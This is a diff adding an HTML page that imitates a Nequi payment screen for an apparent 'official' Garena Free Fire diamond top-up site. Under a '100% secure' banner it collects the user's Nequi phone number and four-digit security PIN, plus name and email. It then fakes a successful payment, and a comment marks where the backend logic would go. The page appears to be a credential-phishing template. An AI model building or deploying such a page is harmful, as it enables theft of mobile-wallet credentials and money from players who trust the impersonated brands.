@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagar con Nequi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(180deg, #3D1F5B 0%, #1A0B2E 100%);
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .nequi-gradient {
+            background: linear-gradient(135deg, #6B2D9E 0%, #8B3FC8 100%);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div class="w-full max-w-md">
+
+        <!-- LOGO NEQUI -->
+        <div class="text-center mb-8">
+            <img src="images/nequi.png" alt="Nequi" class="h-16 mx-auto mb-4">
+            <h1 class="text-2xl font-bold text-white">Pago seguro con Nequi</h1>
+            <p class="text-purple-200 text-sm mt-2">Centro Oficial de Recargas Garena</p>
+        </div>
+
+        <!-- CARD PRINCIPAL -->
+        <div class="bg-white rounded-3xl shadow-2xl overflow-hidden">
+
+            <!-- HEADER CON MONTO -->
+            <div class="nequi-gradient text-white p-6 text-center">
+                <p class="text-sm opacity-90">Total a pagar</p>
+                <p class="text-4xl font-bold mt-1" id="totalAmount">COP$ 76.800</p>
+                <p class="text-xs opacity-75 mt-2" id="itemDescription">2,180 Diamantes + Bonus 💎 218</p>
+            </div>
+
+            <!-- STEP 1: NÚMERO DE CELULAR -->
+            <div id="step1" class="p-6">
+                <h2 class="text-xl font-bold text-gray-800 mb-4">Ingresa tu número Nequi</h2>
+
+                <div class="mb-6">
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Número de celular</label>
+                    <input type="tel" id="phoneNumber"
+                        class="w-full px-4 py-3 border-2 border-gray-300 rounded-xl text-lg focus:border-purple-600 focus:outline-none"
+                        placeholder="300 123 4567" maxlength="10">
+                    <p class="text-xs text-gray-500 mt-2">Ingresa el número registrado en tu cuenta Nequi</p>
+                </div>
+
+                <button onclick="goToStep2()"
+                    class="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-bold py-4 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all shadow-lg">
+                    Continuar
+                </button>
+
+                <button onclick="window.history.back()"
+                    class="w-full mt-3 text-gray-600 font-medium py-3 rounded-xl hover:bg-gray-100 transition-all">
+                    Cancelar
+                </button>
+            </div>
+
+            <!-- STEP 2: CÓDIGO PIN (OCULTO) -->
+            <div id="step2" class="p-6 hidden">
+                <div class="text-center mb-6">
+                    <div class="w-16 h-16 bg-purple-100 rounded-full mx-auto mb-4 flex items-center justify-center">
+                        <svg class="w-8 h-8 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                    </div>
+                    <h2 class="text-xl font-bold text-gray-800">Ingresa tu PIN de seguridad</h2>
+                    <p class="text-sm text-gray-600 mt-2">Número: <span id="displayPhone" class="font-bold"></span></p>
+                </div>
+
+                <div class="flex justify-center gap-3 mb-8">
+                    <input type="password" maxlength="1"
+                        class="pin-input w-14 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-purple-600 focus:outline-none"
+                        data-index="0">
+                    <input type="password" maxlength="1"
+                        class="pin-input w-14 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-purple-600 focus:outline-none"
+                        data-index="1">
+                    <input type="password" maxlength="1"
+                        class="pin-input w-14 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-purple-600 focus:outline-none"
+                        data-index="2">
+                    <input type="password" maxlength="1"
+                        class="pin-input w-14 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-xl focus:border-purple-600 focus:outline-none"
+                        data-index="3">
+                </div>
+
+                <button onclick="processPay()" id="confirmBtn"
+                    class="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-bold py-4 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
+                    disabled>
+                    Confirmar Pago
+                </button>
+
+                <button onclick="backToStep1()"
+                    class="w-full mt-3 text-gray-600 font-medium py-3 rounded-xl hover:bg-gray-100 transition-all">
+                    Atrás
+                </button>
+            </div>
+
+            <!-- STEP 3: PROCESANDO (OCULTO) -->
+            <div id="step3" class="p-6 hidden text-center">
+                <div class="py-8">
+                    <div
+                        class="w-20 h-20 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto mb-6">
+                    </div>
+                    <h2 class="text-xl font-bold text-gray-800 mb-2">Procesando pago...</h2>
+                    <p class="text-sm text-gray-600">Por favor espera un momento</p>
+                </div>
+            </div>
+
+            <!-- STEP 4: ÉXITO (OCULTO) -->
+            <div id="step4" class="p-6 hidden text-center">
+                <div class="py-8">
+                    <div class="w-20 h-20 bg-green-100 rounded-full mx-auto mb-6 flex items-center justify-center">
+                        <svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                        </svg>
+                    </div>
+                    <h2 class="text-2xl font-bold text-gray-800 mb-2">¡Pago exitoso!</h2>
+                    <p class="text-gray-600 mb-6">Tus diamantes se entregarán en breve</p>
+
+                    <div class="bg-gray-50 rounded-xl p-4 mb-6 text-left">
+                        <div class="flex justify-between mb-2">
+                            <span class="text-sm text-gray-600">Monto</span>
+                            <span class="font-bold" id="successAmount"></span>
+                        </div>
+                        <div class="flex justify-between mb-2">
+                            <span class="text-sm text-gray-600">Artículo</span>
+                            <span class="font-bold" id="successItem"></span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-sm text-gray-600">Método</span>
+                            <span class="font-bold">Nequi</span>
+                        </div>
+                    </div>
+
+                    <button onclick="window.location.href='index.html'"
+                        class="w-full bg-gradient-to-r from-purple-600 to-purple-800 text-white font-bold py-4 rounded-xl hover:from-purple-700 hover:to-purple-900 transition-all">
+                        Volver al inicio
+                    </button>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- INFO SEGURIDAD -->
+        <div class="mt-6 text-center">
+            <div class="flex items-center justify-center gap-2 text-white text-sm">
+                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                    <path
+                        d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+                </svg>
+                <span>Pago 100% seguro y encriptado</span>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Obtener datos del pago desde URL params
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || 'COP$ 76.800';
+        const description = urlParams.get('desc') || '2,180 Diamantes + Bonus 💎 218';
+
+        document.getElementById('totalAmount').textContent = amount;
+        document.getElementById('itemDescription').textContent = description;
+
+        // STEP 2: Ir al PIN
+        function goToStep2() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+
+            if (phone.length < 10) {
+                alert('Por favor ingresa un número válido de 10 dígitos');
+                return;
+            }
+
+            document.getElementById('displayPhone').textContent = phone;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
+            // Focus en primer input PIN
+            document.querySelectorAll('.pin-input')[0].focus();
+        }
+
+        function backToStep1() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+
+            // Limpiar PIN
+            document.querySelectorAll('.pin-input').forEach(input => input.value = '');
+            document.getElementById('confirmBtn').disabled = true;
+        }
+
+        // Auto-focus entre inputs PIN
+        const pinInputs = document.querySelectorAll('.pin-input');
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function () {
+                if (this.value.length === 1 && index < 3) {
+                    pinInputs[index + 1].focus();
+                }
+
+                // Habilitar botón si todos están llenos
+                const allFilled = Array.from(pinInputs).every(inp => inp.value.length === 1);
+                document.getElementById('confirmBtn').disabled = !allFilled;
+            });
+
+            input.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Procesar pago
+        function processPay() {
+            // Mostrar loading
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+
+            // Simular proceso de pago (2 segundos)
+            setTimeout(() => {
+                document.getElementById('step3').classList.add('hidden');
+                document.getElementById('step4').classList.remove('hidden');
+
+                // Llenar datos de éxito
+                document.getElementById('successAmount').textContent = amount;
+                document.getElementById('successItem').textContent = description;
+
+                // AQUÍ IRÍA TU LÓGICA REAL DE BACKEND
+                // Ejemplo: enviar datos al servidor, guardar en BD, etc.
+            }, 2000);
+        }
+    </script>
+<!-- MODAL DE CONFIRMACIÓN DE PAGO -->
+<div id="paymentModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/80 p-4">
+    <div class="relative w-full max-w-lg rounded-xl bg-[#1e2139] shadow-2xl">
+
+        <!-- Botón cerrar -->
+        <button onclick="closePaymentModal()" class="absolute right-4 top-4 text-gray-400 hover:text-white">
+            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+            </svg>
+        </button>
+
+        <!-- Header con Banner -->
+        <div class="overflow-hidden rounded-t-xl">
+            <img src="images/free-fire-banner.jpg" alt="Free Fire" class="h-32 w-full object-cover">
+        </div>
+
+        <!-- Icono del juego centrado -->
+        <div class="flex justify-center -mt-12">
+            <img src="images/free-fire-icon.png" alt="Free Fire" class="h-20 w-20 rounded-xl border-4 border-[#1e2139]">
+        </div>
+
+        <!-- Título -->
+        <h2 class="mt-3 text-center text-xl font-bold text-white">Free Fire</h2>
+
+        <!-- Contenido -->
+        <div class="p-6">
+
+            <!-- Monto Total -->
+            <div class="mb-4 rounded-lg bg-[#2a2d4a] p-4">
+                <div class="flex items-center justify-between">
+                    <span class="text-sm text-text-secondary">Monto total</span>
+                    <div class="flex items-center gap-1">
+                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
+                        <span id="modalTotalDiamonds" class="text-lg font-bold text-white">341</span>
+                    </div>
+                </div>
+
+                <div class="mt-2 flex items-center justify-between border-t border-line/30 pt-2">
+                    <span class="text-xs text-text-secondary">Precio inicial</span>
+                    <div class="flex items-center gap-1">
+                        <img src="images/point.png" alt="Diamond" class="h-4 w-4">
+                        <span id="modalBaseDiamonds" class="text-sm font-bold text-white">310</span>
+                    </div>
+                </div>
+
+                <div class="mt-1 flex items-center justify-between">
+                    <span class="text-xs text-text-secondary">+ Bônus General</span>
+                    <div class="flex items-center gap-1">
+                        <img src="images/point.png" alt="Diamond" class="h-4 w-4">
+                        <span id="modalBonusDiamonds" class="text-sm font-bold text-orange-400">31</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Precio -->
+            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
+                <span class="text-sm text-text-secondary">Precio</span>
+                <span id="modalPrice" class="text-lg font-bold text-primary-red">COP$ 12.000</span>
+            </div>
+
+            <!-- Método de pago -->
+            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
+                <span class="text-sm text-text-secondary">Método de pago</span>
+                <div class="flex items-center gap-2">
+                    <img id="modalPaymentIcon" src="images/nequi.png" alt="Nequi" class="h-6 w-auto">
+                    <span id="modalPaymentName" class="font-bold text-white">Nequi</span>
+                </div>
+            </div>
+
+            <!-- Nombre del jugador -->
+            <div class="mb-4 flex items-center justify-between rounded-lg bg-[#2a2d4a] p-4">
+                <span class="text-sm text-text-secondary">Nombre del jugador</span>
+                <span id="modalPlayerName" class="font-bold text-white">DKS_ICONN</span>
+            </div>
+
+            <!-- Código Promocional -->
+            <div class="mb-4">
+                <label class="mb-2 block text-sm text-text-secondary">Código promocional</label>
+                <div class="flex gap-2">
+                    <input type="text" id="promoCode"
+                        class="flex-1 rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none"
+                        placeholder="Ingresa el código promocional aquí, ej: PROMO1234">
+                    <button class="rounded-lg bg-primary-red px-6 py-3 font-bold text-white hover:bg-red-700">
+                        APLICAR
+                    </button>
+                </div>
+            </div>
+
+            <!-- Título e-wallet -->
+            <p class="mb-3 text-sm text-text-secondary">Selecciona una opción de pago con e-wallet</p>
+
+            <!-- Logo método seleccionado -->
+            <div class="mb-4 flex items-center gap-3 rounded-lg bg-[#2a2d4a] p-3">
+                <img id="modalPaymentLogo" src="images/nequi.png" alt="Nequi" class="h-8 w-auto">
+                <span id="modalPaymentMethod" class="font-bold text-white">Nequi</span>
+            </div>
+
+            <!-- Nombre y Apellido -->
+            <div class="mb-4">
+                <label class="mb-2 block text-sm text-text-secondary">Nombre y Apellido</label>
+                <input type="text" id="fullName"
+                    class="w-full rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none"
+                    placeholder="Nombre y Apellido">
+            </div>
+
+            <!-- Correo Electrónico -->
+            <div class="mb-6">
+                <label class="mb-2 block text-sm text-text-secondary">Correo Electrónico</label>
+                <input type="email" id="email"
+                    class="w-full rounded-lg border border-box-border bg-[#2a2d4a] px-4 py-3 text-white placeholder-gray-500 focus:border-primary-red focus:outline-none"
+                    placeholder="Correo Electrónico">
+            </div>
+
+            <!-- Botón Proceder al pago -->
+            <button onclick="processPayment()"
+                class="w-full rounded-lg bg-primary-red py-4 text-lg font-bold text-white hover:bg-red-700">
+                Proceder al pago
+            </button>
+
+        </div>
+    </div>
+</div>
+
+</body>
+
+</html>
